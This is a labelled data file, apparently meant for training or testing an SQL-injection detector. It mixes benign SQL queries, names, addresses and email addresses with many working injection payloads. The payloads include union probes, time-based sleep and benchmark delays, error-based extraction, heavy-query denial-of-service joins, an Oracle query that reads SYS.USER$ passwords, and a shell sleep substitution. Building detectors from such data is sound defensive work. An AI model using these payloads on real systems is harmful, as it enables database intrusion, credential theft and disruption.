payload	label
"1""   )    )    as aamh where 7432  =  7432   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --"	1
carretera de vista-rica s/n,	0
-9721'  )   or 9287  =  4362#	1
0ntrecerrar	0
SELECT AVG ( hidden ) FROM too SELECT SUM ( thumb ) 	0
-2569' union all select 4484--	1
-7238%' or make_set  (  5375  =  9563,9563  )   and '%'  =  '	1
1'   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (   'ytxg'  =  'ytxg	1
"1""  )   where 9648  =  9648 and elt  (  1210  =  1210,sleep  (  5   )    )   --"	1
"-4876""   )    )    as saug where 2256  =  2256 union all select 2256,2256,2256,2256,2256,2256,2256,2256,2256,2256--"	1
1   )    )    as rcbz where 4563  =  4563 and 2006  =  2006	1
3602040000000000	0
SELECT * FROM problem WHERE movie = 'add' LIMIT 3	0
duo_davalos@designworld.cz	0
SELECT Count ( * )  AS introduced	0
prado de la guzpea	0
SELECT * FROM powerful WHERE melted BETWEEN 'dinner' AND 'topic'	0
select   (  case when   (  9490  =  6134  )   then 9490 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--	1
"1""   )    )     )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""fjwv"" like ""fjwv"	1
SELECT * FROM practical FETCH FIRST 50 PERCENT ROWS ONLY	0
 union select	1
"1%""   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #"	1
957099000000000	0
SELECT AVG ( manner ) FROM five SELECT SUM ( sister ) 	0
koontz	0
SELECT * FROM believed WHERE impossible = 'pictured'  AND City = 'fair'	0
SELECT * FROM yes WHERE certainly IN  ( SELECT heard FROM track ) 	0
SELECT * FROM blow ORDER BY cattle	0
SELECT * FROM women WHERE bowl = 'near'  OR sea = 'ship'	0
jaworsky	0
dierkop@hayunmundoahifuera.id	0
SELECT * FROM habit WHERE empty = 'wish'  AND City = 'stopped'	0
c/ mare de deu de fatima, 165	0
31560	0
SELECT AVG ( western ) FROM main SELECT SUM ( orange ) 	0
barby	0
SELECT * FROM smell  WHERE roar NOT LIKE '[review]%'	0
31588	0
-1375'   )    )     )   or   (  1226  =  9648  )  *9648 and    (    (     (  'kfoy' like 'kfoy	1
"-1333""   )    )    union all select 2376,2376,2376,2376,2376,2376,2376,2376,2376--"	1
1656	0
   SELECT specific, matter, dailyFROM customs WHERE wave  IS NOT NULL	0
1  )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  2303  =  2303	1
SELECT future ( s )  FROM laid SELECT tight FROM writing	0
SELECT MIN ( importance )  AS health FROM log	0
"1""  )   where 7452  =  7452"	1
SELECT printed ( s )  FROM verb FULL OUTER JOIN	0
1%'   )    )     )   and elt  (  3114  =  3114,sleep  (  5   )    )   #	1
1' in boolean mode  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  #	1
-6190'  )   where 2621  =  2621 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --	1
62258107m	0
"1%""   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #"	1
SELECT limited ( s )  FROM found UNION ALL	0
"1"" where 4183  =  4183 union all select null,null,null,null,null,null--"	1
SELECT TOP 3 * FROM through WHERE anyone = 'turn'	0
cabildeo	0
"1""  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --"	1
1  )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --	1
SELECT TOP 3 * FROM being SELECT * FROM like 3SELECT * FROM trade	0
"1%"" and 4595  =  4595#"	1
"1""   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   ""nsyl""  =  ""nsyl"	1
"SELECT * FROM struggle WHERE himself BETWEEN ""sound"" AND    ""pass"""	0
SELECT * FROM tears FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM softly	0
"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  ""jzmg""  =  ""jzmg"	1
"1""   )    )     )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  ""jmjr"" like ""jmjr"	1
   SELECT Employees.final, COUNT ( Orders.earlyID )  AS carFROM    ( OrdersINNER JOIN which ON Orders.supportID  =  Employees.soilID ) 	0
"1""   )    )    or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (   ""nubc"" like ""nubc"	1
SELECT wp_posts.* FROM wp_posts WHERE 1 = 1 AND wp_posts.ID IN  ( 367676,11514,11451,181,28557,262312,299801,4982,416,69244,179,28565,185,287,195,289969,290914 )  AND wp_posts.post_type  =  'page' AND   (  (  wp_posts.post_status  =  'publish'  )  )   ORDER BY wp_posts.post_date DESC	0
 select * from users where id  =  11<1# union select 1,version  (    )   -- 1	1
SELECT TOP 3 * FROM only SELECT * FROM breathe 3SELECT * FROM wide	0
select * from generate_series  (  9167,9167,case when   (  9167  =  2273  )   then 1 else 0 end  )   limit 1--	1
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i	1
bru_na	0
SELECT third FROM dozen UNION ALL SELECT wonderful FROM opportunity ORDER BY welcome	0
 UPDATE sit SET silly = 'high'WHERE wealth = 'collect'	0
1',  (  select   (  case when   (  6560  =  2813  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  	1
select sleep  (  5  )   and    (    (     (  'qjsc'  =  'qjsc	1
uriz carmona	0
-4305   )    )     )   union all select 2401,2401--	1
SELECT city ( s )  FROM involved FULL OUTER JOIN	0
SELECT AVG ( lower )  FROM lunch  SELECT SUM ( time ) 	0
SELECT * FROM common WHERE planned NOT BETWEEN 'satellites' AND 'victory'	0
1   )    )    as aeat where 1007  =  1007 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --	1
SELECT * FROM read WHERE slightly = 'remember' FETCH FIRST 3 ROWS ONLY	0
SELECT * FROM himself WHERE needed BETWEEN '1996-07-01' AND '1996-07-31'	0
"-8040""   )    )     )   or make_set  (  3916  =  6787,6787  )   and    (    (     (  ""laar"" like ""laar"	1
cuevas de san marcos	0
SELECT * FROM explain WHERE NOT this = 'blind'  AND NOT stranger = 'who'	0
 SELECT * FROM this ORDER BY older ASC, clearly DESC	0
SELECT * FROM basket FETCH FIRST 50 PERCENT ROWS ONLY	0
"1%""   )    )    and 7358  =  6986--"	1
koichi	0
   SELECT swim, again, thrown FROM diameter WHERE driver  IS NULL	0
2esco63enti2	0
1'   )    )    as pgif where 6346  =  6346	1
"-9318""   )    )     )   union all select 5223,5223,5223,5223#"	1
"-6357""  )   order by 1--"	1
mon3g69l5o	0
-6722'  )   order by 1#	1
"1""  )   union all select null,null,null,null,null,null,null#"	1
calle pea de francia, 58,	0
lucio	0
SELECT * FROM fuel WHERE addition BETWEEN '1996-07-01' AND '1996-07-31'	0
-5516'+  (  select 'bmlv' where 7188  =  7188 union all select 7188,7188,7188,7188,7188,7188,7188,7188#	1
1  )   as phja where 4627  =  4627	1
or a   =   a	1
adalino	0
SELECT * FROM walk WHERE sudden LIKE '%serious%'	0
  SELECT nature AS milk, yet AS [ranch]  FROM complete	0
SELECT * FROM fall WHERE NOT attention = 'our'  AND NOT bad = 'plan'	0
"-5644""   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  ""evcf""  =  ""evcf"	1
1 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) 	1
SELECT COUNT ( ourselves ) FROM saw	0
1'+  (  select 'swxi' where 7651  =  7651 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4   )    )   +'	1
-3794'  )   union all select 2485,2485,2485,2485,2485--	1
 select * from users where id  =  '1' union select $ _,@@VERSION -- 1'	1
" select sleep  (  5  )   and    (    (     (  ""zlal""  =  ""zlal"	1
SELECT * FROM pound	0
castrillo de la valduerna	0
nagaraja	0
iif  (  5462  =  8866,1,1/0  )  	1
oco	0
"-2605""  )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  ""cikb"" like ""cikb"	1
melanson	0
6529220000000000	0
SELECT TOP 3 * FROM source WHERE held = 'hard'	0
SELECT * FROM  ( SELECT plant FROM breakfast ) 	0
1  )   as ywrn where 1893  =  1893	1
 SELECT * FROM laugh ORDER BY until ASC, grandmother DESC	0
SELECT option_value FROM wp_options WHERE option_name  =  '_houzez_property_label_2691' LIMIT 1	0
   SELECT point, man, pinkFROM jungle WHERE canal  IS NOT NULL	0
88280590n	0
mandayona	0
"1%""   )    )     )   order by 1--"	1
SELECT AVG ( Price ) FROM garage	0
1 where 4319  =  4319 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --	1
1'  )   where 5883  =  5883 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --	1
"1%"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #"	1
8554610000000000	0
1 where 7425  =  7425 rlike   (  select   (  case when   (  4056  =  3196  )   then 1 else 0x28 end   )    )   --	1
10700	0
SELECT these FROM change	0
SELECT * FROM wp_posts WHERE  ( post_type  =  'page' AND post_status  =  'publish' )  AND post_parent  =  181 ORDER BY wp_posts.post_title ASC LIMIT 0,1	0
SELECT * FROM species ORDER BY love	0
   SELECT cold, garage, brownFROM orange WHERE coal  IS NOT NULL	0
SELECT TOP 3 * FROM simple WHERE especially = 'frame' SELECT * FROM kind	0
SELECT * FROM simply WHERE settle = 'another'  AND City = 'nation'	0
SELECT AVG ( victory ) FROM teeth SELECT SUM ( cloud ) 	0
SELECT * FROM your WHERE river = 'cast'  OR beyond = 'solid'	0
SELECT * FROM equally WHERE fur NOT LIKE 'were%'	0
-3598  )   union all select 2264#	1
select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and '%'  =  '	1
calle arriola 29,	0
SELECT * FROM church WHERE captured NOT BETWEEN 'invented' AND 'fifty'	0
ranez@sandrasummer.bi	0
SELECT * FROM officer WHERE taught  BETWEEN 10 AND 20	0
SELECT * FROM  ( SELECT fight FROM roll ) 	0
select   (  case when   (  2914  =  3335  )   then 2914 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--	1
SELECT month FROM pride UNION SELECT safety FROM push ORDER BY managed	0
4945	0
-2314%'   )    )    union all select 4612,4612--	1
piero	0
-1802' or 7931  =  5841--	1
-7240'   )    )    union all select 8064,8064,8064#	1
 select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1	1
1' in boolean mode  )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --	1
"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  ""%""  =  """	1
47239	0
mario	0
"1%""   )    )    rlike sleep  (  5  )  #"	1
1'+  (  select fhbk where 2570  =  2570 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   +'	1
SELECT AVG ( balloon ) FROM pain SELECT SUM ( negative ) 	0
1'   )    )    or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   'gyre'  =  'gyre	1
25471	0
"-9208%""   )    )    or 8571  =  8571--"	1
"admin"" or 1  =  1#"	1
SELECT AVG ( tree ) FROM nervous SELECT SUM ( happy ) 	0
7860	0
hermanos gascon 141	0
SELECT * FROM corn WHERE offer = 'atom' FETCH FIRST 3 ROWS ONLY	0
1%' union all select null,null,null,null,null,null--	1
SELECT * FROM greater WHERE Price NOT BETWEEN 10 AND 20	0
SELECT TOP 3 * FROM program	0
SELECT MIN ( making )  AS minerals FROM plural	0
"1"" where 4633  =  4633 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --"	1
SELECT * FROM steep 3 SELECT * FROM dangerous	0
"1""   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  ""suxh""  =  ""suxh"	1
-9762  )   or elt  (  5773  =  8986,8986  )  	1
SELECT * FROM forth WHERE wish BETWEEN '1996-07-01' AND '1996-07-31'	0
calle calderon de la barca, 141	0
   SELECT careful, aware, reasonFROM plane WHERE flag  IS NOT NULL	0
1  )   where 9012  =  9012 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --	1
li74re04	0
DELETE FROM deal WHERE behavior = 'white'	0
chimillas	0
SELECT COUNT ( DISTINCT swim )  FROM anything	0
 select * from users where id  =  1 <@$_ union select 1,version  (    )   -- 1	1
plza. almudaina s/n	0
desortija0a	0
" select * from users where id  =  1 or 1#""$ union select 'a',version  (    )   -- 1"	1
"SELECT * FROM possibly WHERE drop BETWEEN ""earn"" AND    ""pencil"""	0
SELECT hall ( s FROM shells RIGHT JOIN	0
"1""  )   as xrsi where 9498  =  9498"	1
1%'   )    )    or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --	1
SELECT * FROM friend	0
  SELECT * FROM limited WHERE to NOT IN  ( 'struck', 'long', 'machine' )  	0
SELECT thick ( s ) FROM pleasant INNER JOIN	0
banerjee6@getgold.ec	0
SELECT * FROM seed WHERE hot = 'lovely'  OR conversation = 'century'	0
40529	0
SELECT * FROM particularly WHERE unless BETWEEN 'heavy' AND 'push'	0
88903644l	0
SELECT poet ( s )  FROM question	0
SELECT * FROM flat FETCH FIRST 3 ROWS ONLY	0
SELECT TOP 50 PERCENT * FROM thy	0
DELETE FROM married WHERE suppose = 'local'	0
85009634r	0
philipa	0
1418	0
SELECT * FROM he WHERE jungle BETWEEN 'cup' AND 'could'	0
SELECT * FROM wet WHERE recent BETWEEN '1996-07-01' AND '1996-07-31'	0
212404000000000	0
1' in boolean mode  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   #	1
lavada	0
SELECT TOP 3 * FROM truth	0
 SELECT column_name ( s )  FROM pot,spent	0
stetson	0
SELECT * FROM vote 3	0
SELECT * FROM were WHERE flew = 'die'  AND  ( bright = 'cave' OR quick = 'to' ) 	0
geria	0
1  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  	1
1'  )   as pkis where 3446  =  3446 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --	1
"1""   )    )     )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  ""fpwu"" like ""fpwu"	1
"-3649""   )    )    as eydu where 3220  =  3220 or elt  (  8705  =  1510,1510  )  --"	1
SELECT * FROM person  WHERE feathers = solid	0
15807509t	0
SELECT heat ( s )  FROM flies	0
br8c99ma4290	0
select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  'wweo'  =  'wweo	1
1  )   where 1270  =  1270 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --	1
rohtert	0
1'   )    )    as bsvk where 5985  =  5985 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --	1
$  (  sleep 50  ) 	1
rua picouto, 14,	0
SELECT * FROM progress ORDER BY court DESC	0
if  (  3245  =  6168  )   select 3245 else drop function nafj--	1
1 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  	1
"  SELECT TIME_FORMAT ( ""19:30:10"", ""%h %i %s %p"" ) ;"	0
chorrito bajo, 11	0
"1"" and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""buzb""  =  ""buzb"	1
1   )    )     )   and 6467  =  1864#	1
  SELECT Orders.enjoyrID, Employees.organization, Employees.she FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.singleID ORDER BY Orders.awareID	0
cambrils	0
SELECT * FROM involved WHERE daughter IN  ( SELECT leaf FROM thin ) 	0
SELECT * FROM anybody WHERE full = 'buffalo'  AND  ( conversation = 'rhythm' OR cost = 'merely' ) 	0
7686270000000000	0
1   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   2939  =  2939	1
SELECT * FROM sound ORDER BY mission DESC	0
1'   )    )    as qcgf where 9656  =  9656 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --	1
SELECT * FROM this  WHERE flag NOT LIKE '[get]%'	0
SELECT * FROM chicken ORDER BY beautiful DESC	0
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""%""  =  """	1
"-9864""  )   or elt  (  5885  =  4936,4936  )   and   (  ""bfbb"" like ""bfbb"	1
c/ de pedro vidal s/n, 11d	0
curul	0
SELECT TOP 50 PERCENT * FROM no	0
SELECT * FROM nor FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM improve	0
   SELECT may, shoot, loseFROM cell WHERE busy  IS NOT NULL	0
zaleska_legon@zampy.so	0
urkiaga	0
SELECT * FROM play	0
1'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  'lbwh'  =  'lbwh	1
SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 13610 )  ORDER BY meta_id ASC	0
" select * from users where id  =  1 or ""?,"" or 1  =  1 -- 1"	1
"1%"" and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""%""  =  """	1
1%'  )   union all select null,null,null,null,null--	1
kaunas	0
SELECT option_value FROM wp_options WHERE option_name  =  '_options_footer_logo' LIMIT 1	0
4617330000000000	0
"-4592""   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   ""xvpz""  =  ""xvpz"	1
  UPDATE mental SET win =  'cake', City =  'afternoon' WHERE me =  pull	0
gu5cima	0
SELECT particularly ( s )  FROM expect LEFT JOIN	0
select   (  case when   (  8841  =  9675  )   then 8841 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--	1
SELECT * FROM see FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM our	0
1  )   as ezje where 5234  =  5234 and make_set  (  8403  =  8403,8899  )  --	1
1'   )    )    as nlfq where 3410  =  3410 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --	1
9.83415E+015	0
SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f6c82a3dbb22' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1	0
1' where 8482  =  8482 or sleep  (  5  )  #	1
SELECT large	0
78595518x	0
6370	0
SELECT TOP 3 * FROM opposite WHERE place = 'beside'	0
santaniello_tabernero@enfuerteventura.com.ni	0
SELECT AVG ( zulu ) FROM wealth	0
clay@parcalia.ml	0
SELECT * FROM gone WHERE automobile = 'smaller' LIMIT 3	0
depravador	0
SELECT * FROM claws WHERE mountain = 'steam'  OR pie = 'mistake'	0
SELECT AVG ( Price ) FROM operation	0
60996626m	0
"1""  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""vkqt""  =  ""vkqt"	1
SELECT AVG ( slow )  FROM additional  SELECT SUM ( trouble ) 	0
   SELECT Employees.white, COUNT ( Orders.beforeID )  AS lakeFROM    ( OrdersINNER JOIN herd ON Orders.whistleID  =  Employees.climbID ) 	0
   SELECT cattle, post, sidesFROM breathing WHERE tropical  IS NOT NULL	0
SELECT * FROM look WHERE chair = 'grain'  OR park = 'himself'	0
SELECT * FROM must ORDER BY blood	0
SELECT AVG ( cannot ) FROM recognize SELECT SUM ( duck ) 	0
select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'atvu'  =  'atvu	1
  SELECT will,suit,green FROM damage LEFT JOIN Orders ON rod.pineID =  outer.ask ORDER BY pipe.brought	0
SELECT MIN ( real )  AS means FROM struggle	0
1' where 9544  =  9544	1
visionario	0
"SELECT * FROM cow WHERE torn BETWEEN ""butter"" AND    ""refused"""	0
SELECT * FROM actually FETCH FIRST 50 PERCENT ROWS ONLY	0
"-4166%""  )   union all select 5190--"	1
if  (  3490  =  4920  )   select 3490 else drop function hlzt--	1
  SELECT thank AS dried, studied AS [refused]  FROM land	0
1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #	1
SELECT COUNT ( pride ) FROM adjective	0
-7452 where 2224  =  2224 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --	1
42462633x	0
1'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  'dtym'  =  'dtym	1
"SELECT * FROM rule WHERE balance BETWEEN ""plastic"" AND    ""whatever"""	0
   SELECT thy, think, paint FROM cast WHERE top  IS NULL	0
1'   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (     (  'vbda' like 'vbda	1
SELECT UserId, Name, PasswordFROM Users WHERE UserId  =  105 or 1 = 1;	0
vilamasa pacheca	0
"1"" where 6785  =  6785 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --"	1
1   )    )     )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  3505  =  3505	1
1 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  	1
"1""  )   as cfed where 8220  =  8220 union all select null,null,null,null,null,null,null,null,null#"	1
SELECT ProductName FROM Products WHERE ProductID  =  ALL	0
SELECT * FROM tin FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM lunch	0
jehovah	0
SELECT continent ( s )  FROM him SELECT grain ( s ) 	0
philips@davidymamen.sa	0
1%'   )    )     )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  '%'  =  '	1
 or   (  EXISTS  ) 	1
SELECT AVG ( easily ) FROM sat	0
  SELECT IF ( 500<1000, 5, 10 ) ;	0
1   )    )     )   and 4595  =  4595#	1
1894430000000000	0
SELECT TOP 3 * FROM circle WHERE fed = 'sport'	0
 SELECT column_name ( s )  FROM vapor,name	0
SELECT * FROM goose WHERE mistake BETWEEN judge09/01/1996twelve AND within15/31/1996plain	0
SELECT TOP 3 * FROM buried SELECT * FROM waste 3SELECT * FROM railroad	0
